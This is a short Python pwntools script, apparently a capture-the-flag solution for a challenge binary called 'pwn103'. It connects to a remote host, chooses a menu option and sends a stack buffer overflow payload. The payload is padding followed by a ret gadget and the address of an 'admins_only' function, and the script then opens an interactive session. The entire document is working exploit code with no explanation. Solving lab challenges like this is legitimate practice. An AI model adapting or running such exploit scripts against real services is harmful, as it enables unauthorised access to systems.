from pwn import *

context.binary = binary = ELF("./pwn103.pwn103")

p = remote("10.10.179.131", 9003)

p.sendline(b"3")

admin_only_address = p64(binary.symbols.admins_only)
ret_address = p64(0x004016dc)
payload = b"A"*0x20 + b"B"*0x8 + ret_address + admin_only_address


#p = process()

p.recv()
p.sendline(payload)
p.interactive()
